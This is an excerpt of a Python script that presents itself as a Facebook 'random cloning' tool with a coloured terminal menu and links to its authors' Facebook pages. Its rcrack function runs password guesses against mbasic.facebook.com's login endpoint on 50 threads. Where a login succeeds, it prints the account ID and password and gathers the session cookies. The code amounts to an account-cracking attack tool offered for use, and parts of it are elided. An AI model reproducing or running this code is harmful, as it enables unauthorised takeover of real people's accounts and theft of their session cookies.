...
def o():
    ...
    print(logo)
    print(" \033[38;5;46m××××××××××××××××××××××××××××××××××××××××××××××××")
    jalan(" \033[38;5;196m[\033[38;5;195m1\033[38;5;196m]\033[38;5;195m START RANDOM CLONING \033[1;91m[\033[1;97mWORKING\033[1;91m]")
    ...
    print(" \033[38;5;196m[\033[38;5;195m4\033[38;5;196m]\033[38;5;195m MY FB PAGE")
    ...
    if HASAN == '2':
        ...
        return None
    if HASAN == '3':
        os.system('xdg-open https://www.facebook.com/groups/491745971688525/')
        return None
    if HASAN == '4':
        os.system('xdg-open https://www.facebook.com/100239308126018')
        return None
    if HASAN == '0':
        os.system('exit')
        return None
...
logo = ("""
 ...
 \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mCREATED BY\033[38;5;196m   : \033[38;5;195mKHAN-BROTHER TEAM      \033[38;5;46m|
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mFACEBOK      \033[38;5;196m: \033[38;5;195mMr.KhanVau420          \033[38;5;46m|
...
def Hasan():
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        print(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m TOOL OWNER \033[1;97m: \033[38;5;45mKHAN OFFICIAL')
...
def rcrack(uid,pwx,tl):
	...
	lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('    \033[38;5;45m[KHAN-OK🥰] '+uid+' | '+ps+'\033[38;5;46m'+asha(uid)+'\n    \033[38;5;196m[Usar Agent🤖]\033[38;5;195m'+pro+' \033[1;91m ')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\r\r\33[1;31m [KHAN-CP🥺] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r \33[1;93m[%sKHAN\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(H,loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
